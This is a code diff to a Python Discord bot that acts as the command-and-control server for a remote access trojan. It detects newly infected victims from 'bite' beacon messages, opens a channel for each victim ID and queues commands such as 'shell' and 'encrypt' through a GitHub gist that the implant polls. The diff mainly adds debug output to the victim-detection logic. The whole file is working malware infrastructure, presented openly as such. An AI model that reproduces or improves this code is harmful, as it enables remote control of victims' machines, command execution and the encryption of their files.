@@ -188,15 +188,14 @@ import re
 import requests
 import json
 
-# === FILL THESE IN ===
+# === FILL THESE ===
 TOKEN = "YOUR_DISCORD_BOT_TOKEN"
-GUILD_ID = 123456789012345678  # 18-digit server ID
-LOG_CHANNEL_ID = 987654321098765432  # 18-digit webhook channel ID
-GIST_ID = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # 32-char hex from gist URL
-GH_TOKEN = "ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"  # 40-char token starting with ghp_
+GUILD_ID = 123456789012345678  # Server ID
+LOG_CHANNEL_ID = 987654321098765432  # Webhook channel ID
+GIST_ID = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # 32-char
+GH_TOKEN = "ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"  # 40-char
 
-# FIXED RAW URL - USE THIS IN RAT BUILDER FOREVER
-FIXED_RAW_URL = "https://gist.githubusercontent.com/YOUR_GITHUB_USERNAME/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/raw/commands.json"
+FIXED_RAW_URL = "https://gist.githubusercontent.com/YOURUSERNAME/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/raw/commands.json"
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -213,7 +212,7 @@ def update_gist(commands_dict):
     if r.status_code == 200:
         print("[+] Gist updated")
     else:
-        print(f"[-] Gist error: {r.text}")
+        print(f"[-] Gist fail: {r.text}")
 
 async def create_victim_section(vid):
     guild = client.get_guild(GUILD_ID)
@@ -227,29 +226,42 @@ async def create_victim_section(vid):
 
 @client.event
 async def on_ready():
-    print(f"[+] Bot live - FIXED RAW URL for RAT: {FIXED_RAW_URL}")
+    print(f"[+] Bot online - watching channel {LOG_CHANNEL_ID}")
 
 @client.event
 async def on_message(message):
-    if message.author.bot: return
-
-    # BITE DETECTION
+    # Loud debug for EVERY message in log channel
     if message.channel.id == LOG_CHANNEL_ID:
+        print("\n[WEBHOOK MESSAGE DETECTED]")
+        print(f"Content: {message.content}")
+        print(f"Author: {message.author} (bot: {message.author.bot}) (webhook_id: {message.webhook_id})")
+        print(f"Embeds count: {len(message.embeds)}")
+        for i, embed in enumerate(message.embeds):
+            print(f"Embed {i} title: {embed.title}")
+            print(f"Embed {i} description: {embed.description}")
+            print(f"Embed {i} full dict: {embed.to_dict()}")
+        
         full_text = message.content
         for embed in message.embeds:
             full_text += " " + (embed.title or "") + " " + (embed.description or "")
-        if "WE GOT A BITE CAPTAIN" in full_text.upper():
-            vid_match = re.search(r"\[([a-f0-9]{8})\]", full_text)
+        print(f"Combined text for parsing: {full_text}")
+        
+        if "BITE" in full_text.upper() or "CAPTAIN" in full_text.upper():
+            print("[TRIGGER WORD FOUND - attempting ID extract]")
+            vid_match = re.search(r"\[([a-f0-9]{8})\]", full_text, re.IGNORECASE)
             if vid_match:
                 vid = vid_match.group(1)
+                print(f"[!!!] VICTIM ID EXTRACTED: {vid}")
                 if vid not in known_victims:
                     known_victims.add(vid)
                     ch = await create_victim_section(vid)
                     await message.reply(f"**BITE** Victim **{vid}** hooked — Room: {ch.mention}")
+            else:
+                print("[-] No [8charid] found in text")
 
-    # COMMANDS IN VICTIM CHANNELS
-    if message.channel.name.startswith("logs-") and message.content.startswith("-"):
-        vid = message.channel.name[5:13]  # pulls the 8-char ID
+    # Commands section unchanged - your -ss / -clear still work
+    if message.channel.name.startswith("logs-") and message.content.startswith("-") and not message.author.bot:
+        vid = message.channel.name[5:13]
         content = message.content[1:].strip().lower()
         parts = content.split(" ", 1)
         cmd = parts[0]
@@ -261,18 +273,17 @@ async def on_message(message):
                 if vid in current:
                     del current[vid]
                     update_gist(current)
-                    await message.reply(f"Commands cleared for victim **{vid}**")
+                    await message.reply(f"Cleared for **{vid}**")
                 else:
-                    await message.reply(f"No active commands for **{vid}**")
+                    await message.reply(f"Nothing to clear for **{vid}**")
             except:
-                await message.reply("Clear failed — check console")
+                await message.reply("Clear failed")
             return
         
         full_cmd = cmd
         if cmd in ["encrypt", "shell"]:
             full_cmd += " " + arg
         
-        # Queue the command
         try:
             current = requests.get(FIXED_RAW_URL).json()
         except:
@@ -280,6 +291,6 @@ async def on_message(message):
         current[vid] = full_cmd
         update_gist(current)
         
-        await message.reply(f"**{full_cmd}** queued for victim **{vid}**\nLive in <30s — no rebuild needed")
+        await message.reply(f"**{full_cmd}** queued for **{vid}** — live in <30s")
 
 client.run(TOKEN)
